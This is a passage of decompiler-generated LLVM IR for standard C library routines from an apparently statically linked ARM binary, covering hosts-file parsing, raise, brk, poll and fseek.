  %v0_18fe435 = phi i32 [ %v2_18ec0, %dec_label_pc_18f2c.preheader ], [ %v1_18f28, %dec_label_pc_18f28 ], [ %v0_18f28, %dec_label_pc_18f38 ]
  %v0_18f60 = phi i32 [ %v3_18f2c13, %dec_label_pc_18f2c.preheader ], [ %v3_18f2c, %dec_label_pc_18f28 ], [ %v1_18f40, %dec_label_pc_18f38 ]
  %v7_18f4c = icmp eq i32 %v0_18f60, 10
  br i1 %v7_18f4c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_18f4c
  %v3_18f50 = icmp eq i32 %v0_18f60, 0
  br i1 %v3_18f50, label %bb55, label %dec_label_pc_18f60

.thread3:                                         ; preds = %dec_label_pc_18f4c
  br label %dec_label_pc_190fc.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_190fc.backedge

dec_label_pc_190fc.backedge:                      ; preds = %dec_label_pc_190d8, %dec_label_pc_190f0, %bb55, %dec_label_pc_19070, %.thread3, %dec_label_pc_18f60
  %v0_19104.pre = load i32, i32* @sl, align 4
  store i32 %v2_18ec0, i32* %r0.global-to-local, align 4
  store i32 %v0_19104.pre, i32* %r2.global-to-local, align 4
  %v3_19108 = call i32 @fgets(i32 %v2_18ec0, i32 128, i32 %v0_19104.pre)
  store i32 %v3_19108, i32* %r0.global-to-local, align 4
  %v2_1910c = icmp eq i32 %v3_19108, 0
  store i32 %v2_18ec0, i32* @r4, align 4
  br i1 %v2_1910c, label %dec_label_pc_1911c, label %dec_label_pc_18f2c.preheader

dec_label_pc_18f60:                               ; preds = %bb
  %v7_18f60 = icmp eq i32 %v0_18f60, 35
  br i1 %v7_18f60, label %dec_label_pc_190fc.backedge, label %dec_label_pc_18fe4

dec_label_pc_18f70:                               ; preds = %bb58
  store i32 %v2_18f70, i32* %r2.global-to-local, align 4
  %v4_18f74 = mul i32 %storemerge, 4
  %v5_18f74 = add i32 %v4_18f74, %v2_18f70
  %v2_18f78 = add i32 %v5_18f74, -36
  %v3_18f78 = inttoptr i32 %v2_18f78 to i32*
  store i32 %v0_18f78, i32* %v3_18f78, align 4
  %v0_18f8415 = load i32, i32* %r0.global-to-local, align 4
  %v1_18f8416 = inttoptr i32 %v0_18f8415 to i8*
  %v2_18f8417 = load i8, i8* %v1_18f8416, align 1
  %v3_18f8418 = zext i8 %v2_18f8417 to i32
  store i32 %v3_18f8418, i32* %r2.global-to-local, align 4
  %v2_18f8819 = icmp eq i8 %v2_18f8417, 0
  br i1 %v2_18f8819, label %dec_label_pc_18fb8.preheader, label %dec_label_pc_18f90.lr.ph

dec_label_pc_18f90.lr.ph:                         ; preds = %dec_label_pc_18f70
  %v2_18f94.pre = load i32, i32* @global_var_26250, align 4
  br label %dec_label_pc_18f90

dec_label_pc_18f80:                               ; preds = %dec_label_pc_18fa4
  %v1_18f80 = add i32 %v0_18f80, 1
  store i32 %v1_18f80, i32* %r0.global-to-local, align 4
  %v1_18f84 = inttoptr i32 %v1_18f80 to i8*
  %v2_18f84 = load i8, i8* %v1_18f84, align 1
  %v3_18f84 = zext i8 %v2_18f84 to i32
  store i32 %v3_18f84, i32* %r2.global-to-local, align 4
  %v2_18f88 = icmp eq i8 %v2_18f84, 0
  br i1 %v2_18f88, label %dec_label_pc_18fb8.preheader, label %dec_label_pc_18f90

dec_label_pc_18f90:                               ; preds = %dec_label_pc_18f90.lr.ph, %dec_label_pc_18f80
  %v0_18f80 = phi i32 [ %v0_18f8415, %dec_label_pc_18f90.lr.ph ], [ %v1_18f80, %dec_label_pc_18f80 ]
  %v0_18fa4 = phi i32 [ %v3_18f8418, %dec_label_pc_18f90.lr.ph ], [ %v3_18f84, %dec_label_pc_18f80 ]
  %v3_18f98 = mul nuw nsw i32 %v0_18fa4, 2
  %v4_18f98 = add i32 %v3_18f98, %v2_18f94.pre
  %v5_18f98 = inttoptr i32 %v4_18f98 to i8*
  %v6_18f98 = load i8, i8* %v5_18f98, align 1
  %v1_18f9c = and i8 %v6_18f98, 32
  %v2_18f9c = icmp eq i8 %v1_18f9c, 0
  br i1 %v2_18f9c, label %dec_label_pc_18fa4, label %dec_label_pc_18fb8.preheader

dec_label_pc_18fa4:                               ; preds = %dec_label_pc_18f90
  %v7_18fa4 = icmp eq i32 %v0_18fa4, 10
  br i1 %v7_18fa4, label %dec_label_pc_18fb8.preheader, label %dec_label_pc_18f80

dec_label_pc_18fb8.preheader:                     ; preds = %dec_label_pc_18fa4, %dec_label_pc_18f90, %dec_label_pc_18f80, %dec_label_pc_18f70
  %v0_18fb820 = phi i32 [ %v0_18f8415, %dec_label_pc_18f70 ], [ %v0_18f80, %dec_label_pc_18fa4 ], [ %v0_18f80, %dec_label_pc_18f90 ], [ %v1_18f80, %dec_label_pc_18f80 ]
  %v1_18fb821 = inttoptr i32 %v0_18fb820 to i8*
  %v2_18fb822 = load i8, i8* %v1_18fb821, align 1
  %v3_18fb823 = zext i8 %v2_18fb822 to i32
  store i32 %v3_18fb823, i32* %r2.global-to-local, align 4
  %v2_18fbc24 = icmp eq i8 %v2_18fb822, 0
  br i1 %v2_18fbc24, label %dec_label_pc_18fe0, label %dec_label_pc_18fc4

dec_label_pc_18fb0:                               ; preds = %dec_label_pc_18fc4, %dec_label_pc_18fd8
  %v3_18fb4 = inttoptr i32 %v2_18fb4 to i8*
  store i8 0, i8* %v3_18fb4, align 1
  %v4_18fb4 = load i32, i32* %r0.global-to-local, align 4
  %v5_18fb4 = add i32 %v4_18fb4, 1
  store i32 %v5_18fb4, i32* %r0.global-to-local, align 4
  %v1_18fb8 = inttoptr i32 %v5_18fb4 to i8*
  %v2_18fb8 = load i8, i8* %v1_18fb8, align 1
  %v3_18fb8 = zext i8 %v2_18fb8 to i32
  store i32 %v3_18fb8, i32* %r2.global-to-local, align 4
  %v2_18fbc = icmp eq i8 %v2_18fb8, 0
  br i1 %v2_18fbc, label %dec_label_pc_18fe0, label %dec_label_pc_18fc4

dec_label_pc_18fc4:                               ; preds = %dec_label_pc_18fb8.preheader, %dec_label_pc_18fb0
  %v0_18fd8 = phi i32 [ %v3_18fb8, %dec_label_pc_18fb0 ], [ %v3_18fb823, %dec_label_pc_18fb8.preheader ]
  %v2_18fb4 = phi i32 [ %v5_18fb4, %dec_label_pc_18fb0 ], [ %v0_18fb820, %dec_label_pc_18fb8.preheader ]
  %v2_18fc8 = load i32, i32* @global_var_26250, align 4
  %v3_18fcc = mul nuw nsw i32 %v0_18fd8, 2
  %v4_18fcc = add i32 %v2_18fc8, %v3_18fcc
  %v5_18fcc = inttoptr i32 %v4_18fcc to i8*
  %v6_18fcc = load i8, i8* %v5_18fcc, align 1
  %v1_18fd0 = and i8 %v6_18fcc, 32
  %v2_18fd0 = icmp eq i8 %v1_18fd0, 0
  br i1 %v2_18fd0, label %dec_label_pc_18fd8, label %dec_label_pc_18fb0

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fc4
  %v7_18fd8 = icmp eq i32 %v0_18fd8, 10
  br i1 %v7_18fd8, label %dec_label_pc_18fb0, label %dec_label_pc_18fe0

dec_label_pc_18fe0:                               ; preds = %dec_label_pc_18fb0, %dec_label_pc_18fd8, %dec_label_pc_18fb8.preheader
  %v0_18fe434 = phi i32 [ %v0_18fb820, %dec_label_pc_18fb8.preheader ], [ %v5_18fb4, %dec_label_pc_18fb0 ], [ %v2_18fb4, %dec_label_pc_18fd8 ]
  %v0_18fe0 = load i32, i32* @r8, align 4
  %v1_18fe0 = add i32 %v0_18fe0, 1
  br label %dec_label_pc_18fe4

dec_label_pc_18fe4:                               ; preds = %dec_label_pc_18f60, %dec_label_pc_18fe0
  %storemerge = phi i32 [ %v1_18fe0, %dec_label_pc_18fe0 ], [ 0, %dec_label_pc_18f60 ]
  %v0_18f78 = phi i32 [ %v0_18fe434, %dec_label_pc_18fe0 ], [ %v0_18fe435, %dec_label_pc_18f60 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_18fe4 = inttoptr i32 %v0_18f78 to i8*
  %v2_18fe4 = load i8, i8* %v1_18fe4, align 1
  %v3_18fe4 = zext i8 %v2_18fe4 to i32
  %v2_18fe8 = icmp eq i8 %v2_18fe4, 0
  br i1 %v2_18fe8, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_18fe4
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_18fe4, %bb56
  %v0_18ff8.pr = phi i32 [ %v3_18fe4, %dec_label_pc_18fe4 ], [ 1, %bb56 ]
  %v1_18ff0 = add i32 %storemerge, -4
  %v3_18ff0 = sub i32 3, %storemerge
  %v4_18ff0 = and i32 %v3_18ff0, %storemerge
  %v5_18ff0 = icmp slt i32 %v4_18ff0, 0
  %v6_18ff0 = icmp slt i32 %v1_18ff0, 0
  %v7_18ff0 = icmp eq i32 %storemerge, 4
  %v3_18ff4 = xor i1 %v6_18ff0, %v5_18ff0
  %v4_18ff4 = or i1 %v7_18ff0, %v3_18ff4
  br i1 %v4_18ff4, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_19000

bb58:                                             ; preds = %bb57
  %v2_18ff8 = icmp eq i32 %v0_18ff8.pr, 0
  br i1 %v2_18ff8, label %dec_label_pc_19000, label %dec_label_pc_18f70

dec_label_pc_19000:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1dc40.1139 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1900c = call i32 @__GI_strcoll(i8* %v3_1900c, i32 ptrtoint ([11 x i8]* @global_var_1dc40.1139 to i32))
  store i32 %v4_1900c, i32* %r0.global-to-local, align 4
  %v2_19010 = icmp eq i32 %v4_1900c, 0
  br i1 %v2_19010, label %dec_label_pc_19038.preheader, label %dec_label_pc_1905c

dec_label_pc_19038.preheader:                     ; preds = %dec_label_pc_19000
  br label %dec_label_pc_19038

dec_label_pc_19020:                               ; preds = %dec_label_pc_19050
  %v1_19020 = add i32 %v5_19040, -36
  %v2_19020 = inttoptr i32 %v1_19020 to i32*
  %v3_19020 = load i32, i32* %v2_19020, align 4
  store i32 %v3_19020, i32* %r0.global-to-local, align 4
  %v1_19024 = inttoptr i32 %v3_19020 to i8*
  %v2_19024 = call i32 @__GI_strdup(i8* %v1_19024)
  store i32 %v2_19024, i32* %r0.global-to-local, align 4
  %v0_1902c = load i32, i32* @r4, align 4
  %v1_1902c = add i32 %v0_1902c, 1
  store i32 %v1_1902c, i32* %r2.global-to-local, align 4
  %v5_19030 = mul i32 %v0_1902c, 4
  %v6_19030 = add i32 %v5_19030, ptrtoint (i32* @global_var_2c900.958 to i32)
  %v7_19030 = inttoptr i32 %v6_19030 to i32*
  store i32 %v2_19024, i32* %v7_19030, align 4
  %v0_19034 = load i32, i32* %r2.global-to-local, align 4
  %v1_19034 = load i32, i32* @r7, align 4
  %v2_19034 = inttoptr i32 %v1_19034 to i32*
  store i32 %v0_19034, i32* %v2_19034, align 4
  %v0_1903c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19038

dec_label_pc_19038:                               ; preds = %dec_label_pc_19038.preheader, %dec_label_pc_19020
  %v0_19048 = phi i32 [ 1, %dec_label_pc_19038.preheader ], [ %v0_1903c.pre, %dec_label_pc_19020 ]
  store i32 %v2_18f70, i32* %r2.global-to-local, align 4
  %v1_1903c = load i32, i32* @r8, align 4
  %v2_1903c = sub i32 %v0_19048, %v1_1903c
  %v4_1903c = xor i32 %v1_1903c, %v0_19048
  %v5_1903c = xor i32 %v2_1903c, %v0_19048
  %v6_1903c = and i32 %v5_1903c, %v4_1903c
  %v7_1903c = icmp slt i32 %v6_1903c, 0
  %v8_1903c = icmp slt i32 %v2_1903c, 0
  %v4_19040 = mul i32 %v0_19048, 4
  %v5_19040 = add i32 %v4_19040, %v2_18f70
  store i32 ptrtoint (i32* @global_var_2c90c.955 to i32), i32* @r7, align 4
  %v1_19048 = add i32 %v0_19048, 1
  store i32 %v1_19048, i32* @r5, align 4
  %v2_1904c = xor i1 %v8_1903c, %v7_1903c
  br i1 %v2_1904c, label %dec_label_pc_19050, label %dec_label_pc_1905c

dec_label_pc_19050:                               ; preds = %dec_label_pc_19038
  %v2_19050 = load i32, i32* @global_var_2c90c.955, align 4
  store i32 %v2_19050, i32* @r4, align 4
  %v7_19058 = icmp slt i32 %v2_19050, 3
  br i1 %v7_19058, label %dec_label_pc_19020, label %dec_label_pc_1905c

dec_label_pc_1905c:                               ; preds = %dec_label_pc_19038, %dec_label_pc_19050, %dec_label_pc_19000
  %v0_1905c = load i32, i32* @r6, align 4
  store i32 %v0_1905c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1dc4c.1142 to i32), i32* @r1, align 4
  %v3_19064 = inttoptr i32 %v0_1905c to i8*
  %v4_19064 = call i32 @__GI_strcoll(i8* %v3_19064, i32 ptrtoint ([7 x i8]* @global_var_1dc4c.1142 to i32))
  store i32 %v4_19064, i32* %r0.global-to-local, align 4
  %v2_19068 = icmp eq i32 %v4_19064, 0
  br i1 %v2_19068, label %dec_label_pc_190a0.preheader, label %dec_label_pc_19070

dec_label_pc_19070:                               ; preds = %dec_label_pc_1905c
  %v0_19070 = load i32, i32* @r6, align 4
  store i32 %v0_19070, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1dc54.1144 to i32), i32* @r1, align 4
  %v3_19078 = inttoptr i32 %v0_19070 to i8*
  %v4_19078 = call i32 @__GI_strcoll(i8* %v3_19078, i32 ptrtoint ([7 x i8]* @global_var_1dc54.1144 to i32))
  store i32 %v4_19078, i32* %r0.global-to-local, align 4
  %v2_1907c = icmp eq i32 %v4_19078, 0
  br i1 %v2_1907c, label %dec_label_pc_190a0.preheader, label %dec_label_pc_190fc.backedge

dec_label_pc_190a0.preheader:                     ; preds = %dec_label_pc_1905c, %dec_label_pc_19070
  store i32 ptrtoint (i32* @global_var_2c910.1119 to i32), i32* @r4, align 4
  %v2_190a460 = load i32, i32* @global_var_2c910.1119, align 4
  store i32 ptrtoint (i32* @global_var_2c8f0.1123 to i32), i32* @r5, align 4
  %v1_190b063 = add i32 %v2_190a460, -1
  store i32 %v1_190b063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_190a460, 1
  br i1 %tmp5964, label %dec_label_pc_190b8, label %dec_label_pc_19088

dec_label_pc_19088:                               ; preds = %dec_label_pc_190a0.preheader, %dec_label_pc_19088
  %v1_190b065 = phi i32 [ %v1_190b0, %dec_label_pc_19088 ], [ %v1_190b063, %dec_label_pc_190a0.preheader ]
  %v4_19088 = mul i32 %v1_190b065, 4
  %v5_19088 = add i32 %v4_19088, ptrtoint (i32* @global_var_2c8f0.1123 to i32)
  %v6_19088 = inttoptr i32 %v5_19088 to i32*
  %v7_19088 = load i32, i32* %v6_19088, align 4
  store i32 %v7_19088, i32* @r0, align 4
  store i32 %v1_190b065, i32* @global_var_2c910.1119, align 4
  %v0_19090 = call i32 @free()
  store i32 %v0_19090, i32* %r0.global-to-local, align 4
  %v0_19094 = load i32, i32* @r4, align 4
  %v1_19094 = inttoptr i32 %v0_19094 to i32*
  %v2_19094 = load i32, i32* %v1_19094, align 4
  %v1_1909c = load i32, i32* @r5, align 4
  %v5_1909c = mul i32 %v2_19094, 4
  %v6_1909c = add i32 %v1_1909c, %v5_1909c
  %v7_1909c = inttoptr i32 %v6_1909c to i32*
  store i32 0, i32* %v7_1909c, align 4
  store i32 ptrtoint (i32* @global_var_2c910.1119 to i32), i32* @r4, align 4
  %v2_190a4 = load i32, i32* @global_var_2c910.1119, align 4
  store i32 ptrtoint (i32* @global_var_2c8f0.1123 to i32), i32* @r5, align 4
  %v1_190b0 = add i32 %v2_190a4, -1
  store i32 %v1_190b0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_190a4, 1
  br i1 %tmp59, label %dec_label_pc_190b8, label %dec_label_pc_19088

dec_label_pc_190b8:                               ; preds = %dec_label_pc_19088, %dec_label_pc_190a0.preheader
  br label %dec_label_pc_190d8

dec_label_pc_190c0:                               ; preds = %dec_label_pc_190f0
  %v1_190c0 = add i32 %v5_190e0, -36
  %v2_190c0 = inttoptr i32 %v1_190c0 to i32*
  %v3_190c0 = load i32, i32* %v2_190c0, align 4
  store i32 %v3_190c0, i32* %r0.global-to-local, align 4
  %v1_190c4 = inttoptr i32 %v3_190c0 to i8*
  %v2_190c4 = call i32 @__GI_strdup(i8* %v1_190c4)
  store i32 %v2_190c4, i32* %r0.global-to-local, align 4
  %v0_190cc = load i32, i32* @r4, align 4
  %v1_190cc = add i32 %v0_190cc, 1
  store i32 %v1_190cc, i32* %r2.global-to-local, align 4
  %v5_190d0 = mul i32 %v0_190cc, 4
  %v6_190d0 = add i32 %v5_190d0, ptrtoint (i32* @global_var_2c8f0.1123 to i32)
  %v7_190d0 = inttoptr i32 %v6_190d0 to i32*
  store i32 %v2_190c4, i32* %v7_190d0, align 4
  %v0_190d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_190d4 = load i32, i32* @r6, align 4
  %v2_190d4 = inttoptr i32 %v1_190d4 to i32*
  store i32 %v0_190d4, i32* %v2_190d4, align 4
  %v0_190dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_190d8

dec_label_pc_190d8:                               ; preds = %dec_label_pc_190b8, %dec_label_pc_190c0
  %v0_190e8 = phi i32 [ 1, %dec_label_pc_190b8 ], [ %v0_190dc.pre, %dec_label_pc_190c0 ]
  store i32 %v2_18f70, i32* %r2.global-to-local, align 4
  %v1_190dc = load i32, i32* @r8, align 4
  %v2_190dc = sub i32 %v0_190e8, %v1_190dc
  %v4_190dc = xor i32 %v1_190dc, %v0_190e8
  %v5_190dc = xor i32 %v2_190dc, %v0_190e8
  %v6_190dc = and i32 %v5_190dc, %v4_190dc
  %v7_190dc = icmp slt i32 %v6_190dc, 0
  %v8_190dc = icmp slt i32 %v2_190dc, 0
  %v4_190e0 = mul i32 %v0_190e8, 4
  %v5_190e0 = add i32 %v4_190e0, %v2_18f70
  store i32 ptrtoint (i32* @global_var_2c910.1119 to i32), i32* @r6, align 4
  %v1_190e8 = add i32 %v0_190e8, 1
  store i32 %v1_190e8, i32* @r5, align 4
  %v2_190ec = xor i1 %v8_190dc, %v7_190dc
  br i1 %v2_190ec, label %dec_label_pc_190f0, label %dec_label_pc_190fc.backedge

dec_label_pc_190f0:                               ; preds = %dec_label_pc_190d8
  %v2_190f0 = load i32, i32* @global_var_2c910.1119, align 4
  store i32 %v2_190f0, i32* @r4, align 4
  %v7_190f8 = icmp slt i32 %v2_190f0, 4
  br i1 %v7_190f8, label %dec_label_pc_190c0, label %dec_label_pc_190fc.backedge

dec_label_pc_18f2c.preheader:                     ; preds = %dec_label_pc_18f2c.preheader.lr.ph, %dec_label_pc_190fc.backedge
  store i32 %v2_18ec0, i32* %r0.global-to-local, align 4
  %v2_18f2c12 = load i8, i8* %v1_18f2c11, align 4
  %v3_18f2c13 = zext i8 %v2_18f2c12 to i32
  store i32 %v3_18f2c13, i32* %r2.global-to-local, align 4
  %v2_18f3014 = icmp eq i8 %v2_18f2c12, 0
  br i1 %v2_18f3014, label %dec_label_pc_18f4c, label %dec_label_pc_18f38.lr.ph

dec_label_pc_18f38.lr.ph:                         ; preds = %dec_label_pc_18f2c.preheader
  %v2_18f3c.pre = load i32, i32* @global_var_26250, align 4
  br label %dec_label_pc_18f38

dec_label_pc_1911c:                               ; preds = %dec_label_pc_190fc.backedge, %dec_label_pc_190fc.preheader
  %v0_1911c = load i32, i32* @sl, align 4
  store i32 %v0_1911c, i32* %r0.global-to-local, align 4
  %v1_19120 = inttoptr i32 %v0_1911c to i8*
  %v2_19120 = call i32 @__GI_fclose(i8* %v1_19120)
  store i32 %v2_19120, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19134

dec_label_pc_19128:                               ; preds = %dec_label_pc_18f10
  %v0_19128 = call i32 @__GI___h_errno_location()
  store i32 %v0_19128, i32* %r0.global-to-local, align 4
  %v2_19130 = inttoptr i32 %v0_19128 to i32*
  store i32 3, i32* %v2_19130, align 4
  br label %dec_label_pc_19134

dec_label_pc_19134:                               ; preds = %entry, %dec_label_pc_1911c, %dec_label_pc_19128
  store i32 %v2_18ec4, i32* @r0, align 4
  %v1_19144 = call i32 @__pthread_return_void()
  store i32 %v1_19144, i32* %r0.global-to-local, align 4
  store i32 %v6_18ebc, i32* @r5, align 4
  store i32 %v9_18ebc, i32* @r6, align 4
  store i32 %v12_18ebc, i32* @r7, align 4
  store i32 %v15_18ebc, i32* @r8, align 4
  store i32 %v18_18ebc, i32* @sl, align 4
  ret i32 %v1_19144

; uselistorder directives
  uselistorder i32 %v3_18f2c13, { 2, 1, 0 }
  uselistorder i32 %v2_190dc, { 1, 0 }
  uselistorder i32 %v0_190e8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_190b0, { 1, 0 }
  uselistorder i32 %v1_190b065, { 1, 0 }
  uselistorder i32 %v2_1903c, { 1, 0 }
  uselistorder i32 %v0_19048, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_18f78, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_18fb820, { 1, 0, 2 }
  uselistorder i32 %v2_18f70, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_18ec0, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 3, 4, 6, 16, 9, 7, 8, 10, 0, 11, 2, 12, 14, 13, 17, 15 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 20, 6, 5, 7, 9, 8, 11, 10, 13, 12, 21, 14, 15, 18, 16, 19, 23, 22, 17, 28, 27, 24, 26, 0, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2c8f0.1123 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_2c910.1119, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2c910.1119 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2c900.958 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 7, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_2c90c.955, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_19134, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18f2c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_190d8, { 1, 0 }
  uselistorder label %dec_label_pc_19088, { 1, 0 }
  uselistorder label %dec_label_pc_190a0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1905c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19038, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_18fe4, { 1, 0 }
  uselistorder label %dec_label_pc_18fe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18fc4, { 1, 0 }
  uselistorder label %dec_label_pc_18fb0, { 1, 0 }
  uselistorder label %dec_label_pc_18f90, { 1, 0 }
  uselistorder label %dec_label_pc_190fc.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_18f4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_190fc.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_191cc = call i32 @__read_etc_hosts_r()
  ret i32 %v0_191cc
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_191d8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_191e0 = call i32 @__libc_getpid()
  store i32 %v3_191d8, i32* @r4, align 4
  %v0_191ec = call i32 @kill()
  ret i32 %v0_191ec

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_191f0 = add i32 %arg1, 28
  %v2_191f0 = inttoptr i32 %v1_191f0 to i32*
  %v3_191f0 = load i32, i32* %v2_191f0, align 4
  %v1_191f8 = add i32 %arg1, 44
  %v2_191f8 = inttoptr i32 %v1_191f8 to i32*
  %v3_191f8 = load i32, i32* %v2_191f8, align 4
  store i32 %v3_191f0, i32* @global_var_2c914.1149, align 4
  store i32 %v3_191f8, i32* @global_var_2c918.1151, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1921c = call i32 @brk(i32* %arg1)
  %v3_19220 = icmp ult i32 %v2_1921c, %tmp
  store i32 %v2_1921c, i32* @global_var_2c844.1086, align 4
  br i1 %v3_19220, label %dec_label_pc_19234, label %dec_label_pc_19244

dec_label_pc_19234:                               ; preds = %entry
  %v0_19234 = call i32 @__errno_location()
  %v2_1923c = inttoptr i32 %v0_19234 to i32*
  store i32 12, i32* %v2_1923c, align 4
  br label %dec_label_pc_19244

dec_label_pc_19244:                               ; preds = %entry, %dec_label_pc_19234
  %v0_19244 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_19234 ]
  ret i32 %v0_19244

; uselistorder directives
  uselistorder i32* @global_var_2c844.1086, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19244, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19250 = load i32, i32* @r4, align 4
  store i32 %v3_19250, i32* %stack_var_-8, align 4
  %v5_19254 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_19254, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_19254, -4095
  br i1 %tmp, label %dec_label_pc_19274, label %dec_label_pc_19264

dec_label_pc_19264:                               ; preds = %entry
  %v0_19264 = call i32 @__errno_location()
  %v0_19268 = load i32, i32* %r4.global-to-local, align 4
  %v1_19268 = sub i32 0, %v0_19268
  %v2_1926c = inttoptr i32 %v0_19264 to i32*
  store i32 %v1_19268, i32* %v2_1926c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19274

dec_label_pc_19274:                               ; preds = %entry, %dec_label_pc_19264
  %v0_19274 = phi i32 [ %v5_19254, %entry ], [ -1, %dec_label_pc_19264 ]
  %v2_19278 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19278, i32* @r4, align 4
  ret i32 %v0_19274

; uselistorder directives
  uselistorder i32 %v5_19254, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19274, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1927c = load i32, i32* @r2, align 4
  store i32 %v0_1927c, i32* @r3, align 4
  %v0_19284 = call i32 @__GI_fseeko64()
  ret i32 %v0_19284
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_19288 = load i32, i32* @r4, align 4
  %v6_19288 = load i32, i32* @r5, align 4
  %v9_19288 = load i32, i32* @r6, align 4
  %v0_1928c = load i32, i32* @r3, align 4
  %v2_19290 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_1928c, i32* @r6, align 4
  %v0_19298 = load i32, i32* @r0, align 4
  store i32 %v0_19298, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1928c, 3
  br i1 %tmp, label %dec_label_pc_192b4, label %dec_label_pc_192a0

dec_label_pc_192a0:                               ; preds = %entry
  %v0_192a0 = call i32 @__errno_location()
  store i32 %v0_192a0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_192ac = inttoptr i32 %v0_192a0 to i32*
  store i32 22, i32* %v2_192ac, align 4
  br label %.thread3

dec_label_pc_192b4:                               ; preds = %entry
  %v1_192b4 = add i32 %v0_19298, 52
  %v2_192b4 = inttoptr i32 %v1_192b4 to i32*
  %v3_192b4 = load i32, i32* %v2_192b4, align 4
  store i32 %v3_192b4, i32* %r7.global-to-local, align 4
  %v2_192b8 = icmp eq i32 %v3_192b4, 0
  %v0_192bc = load i32, i32* @r1, align 4
  store i32 %v0_192bc, i32* %stack_var_-28, align 4
  br i1 %v2_192b8, label %dec_label_pc_192c8, label %dec_label_pc_192f4

dec_label_pc_192c8:                               ; preds = %dec_label_pc_192b4
  %v1_192c8 = add i32 %v0_19298, 56
  store i32 %v1_192c8, i32* @r4, align 4
